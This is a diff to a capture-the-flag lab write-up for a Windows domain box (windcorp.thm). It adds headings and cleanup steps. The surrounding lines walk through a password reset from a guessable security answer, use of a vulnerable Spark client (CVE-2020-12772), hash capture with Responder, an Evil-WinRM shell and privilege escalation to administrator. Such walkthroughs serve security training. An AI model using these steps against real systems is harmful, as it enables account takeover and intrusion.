@@ -140,6 +140,7 @@ On the site home page there is the picture of Lily Levesque with a dog, inspecti
 
     <img class="img-fluid rounded-circle mb-3" src="img/lilyleAndSparky.jpg" alt="">
 
+## Compromise account
 So we can try to send use lily as username and sparky as pets name, but again we got: 
 Wrong username and/or secret! Let's try with lilyle as username. Again it didn't work, then I tried with lilyle\Sparky. This time the password was reset to a new value, returned in the response.
 <!-- lilyle\ChangeMe#1234 -->
@@ -173,6 +174,7 @@ I started to list the content of the Shared folder:
 
 Here we can get the vulnerable client to install into the attacker machine to try to exploit CVE-2020-12772, that seems the way to get access to the machine.  
 
+## Install Spark client with wine
 Since the client is an old application, I got some problems to run it on my attacker machine (kali 2024.2). The more convinient way I found was to install it using wine32. Since we are going to install a bunch of packages that probably you want use anymore once completed the lab, if your attacker machine is a VM,  I suggest to take a snapshot before to install the whole stuff, to revert it once completed the lab. Anyway at the end of the section you will find the instructions to remove wine completely.
 Let's proceed to install wine and the support for 32bit arch, since the client app is 32bit application
 
@@ -188,7 +190,7 @@ Now we can proceed to downlod the exe from the shared (it takes a while, remembe
     smb: \> get spark_2_8_3.exe
     getting file \spark_2_8_3.exe of size 78765568 as spark_2_8_3.exe (2015.3 KiloBytes/sec) (average 2015.3 KiloBytes/sec)
 
-Now proceed to install the application and executed. Once the client is started you have to set up the following parameters to connect to the server:
+Then proceed to install the application and executed. Once the client is started you have to set up the following parameters to connect to the server:
 
     wine spark_2_8_3.exe 
     ...
@@ -203,6 +205,7 @@ In the setup windows click next four times. Once the setup is finished the login
 - Select Disable certificate hostname verification
 Click Ok to come back to the credential login input. Here insert lilyle credentials and windcorp.thm as domain and click Login.
 
+## Get a shell on the system
 Once logged in, checking the web site home page, it seems that the only online user is <b>buse</b>, so we have to send our payload to him. In the Lyle user window, in the bottom, search for buse. In the results windows double click to the name to open the chat. Before to send our payload let's start Responder:
 
     sudo responder -I tun0
@@ -249,6 +252,7 @@ We can try to use this service:
     Info: Establishing connection to remote endpoint
     *Evil-WinRM* PS C:\Users\buse\Documents> 
 
+## Privilege escalation
 I executed the usual command to verify users permissions:
 
     *Evil-WinRM* PS C:\Users\buse\desktop> whoami /all
@@ -415,10 +419,19 @@ Then I uploaded the file, wait a minute and get a shell again using buse user:
     BUILTIN\Administrators                     Alias            S-1-5-32-544              
     ...
 
-So being administrator we can get the last flag in C:\users\administrator\desktop
+So being administrator we can get the last flag in C:\users\administrator\desktop.
 
+## Remove wine and i386 architecture
+Kill all the process related to Spark client
 
-    
+Remove wine
+
+    sudo apt remove --purge wine32
+    sudo apt remove --purge wine
+    sudo apt autoremove           
+
+# RA2
+
 
 
      
